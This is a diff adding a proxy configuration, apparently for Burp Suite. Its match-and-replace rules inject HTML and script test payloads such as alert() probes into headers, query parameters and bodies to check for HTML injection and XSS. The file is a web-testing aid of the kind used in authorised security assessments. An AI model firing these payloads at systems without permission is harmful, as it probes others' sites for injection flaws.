@@ -1,0 +1,86 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "Inject HTML payload in Referer header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Referer:.*$",
+                "string_replace": "Referer: <script>alert('HTML Injection')</script>"
+            },
+            {
+                "comment": "Inject HTML payload in User-Agent header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^User-Agent:.*$",
+                "string_replace": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) <div><h1>HTML Injection Test</h1></div>"
+            },
+            {
+                "comment": "Inject HTML payload in Cookie header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Cookie:.*$",
+                "string_replace": "Cookie: session=123456; injected=<script>alert('HTML Injection in Cookie')</script>"
+            },
+            {
+                "comment": "Inject HTML payload in query parameter",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": "id=.*$",
+                "string_replace": "id=<img src='x' onerror='alert(\"HTML Injection in Query\")'>"
+            },
+            {
+                "comment": "Inject HTML payload in POST body (for form submission)",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "<form>.*</form>",
+                "string_replace": "<form><input type='text' name='username' value='<b>Injected HTML</b>'></form>"
+            },
+            {
+                "comment": "Inject HTML payload in URI fragment",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Fragment:.*$",
+                "string_replace": "Fragment: <h1>Injected Fragment HTML</h1>"
+            },
+            {
+                "comment": "Inject HTML payload in X-Forwarded-For header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^X-Forwarded-For:.*$",
+                "string_replace": "X-Forwarded-For: 127.0.0.1, <div>Injected HTML</div>"
+            },
+            {
+                "comment": "Inject HTML payload in Accept-Language header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Accept-Language:.*$",
+                "string_replace": "Accept-Language: en-US, <h1>HTML Injection Test</h1>"
+            },
+            {
+                "comment": "Inject HTML payload in Authorization header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Authorization:.*$",
+                "string_replace": "Authorization: Basic YWRtaW46cGFzc3dvcmQ=; <script>alert('HTML Injection in Auth')</script>"
+            },
+            {
+                "comment": "Inject HTML payload in response body (test response manipulation)",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "response_body",
+                "string_match": "<body>.*</body>",
+                "string_replace": "<body><h1>Injected HTML Content</h1><p>This is a test of HTML injection.</p></body>"
+            }
+        ]
+    }
+}
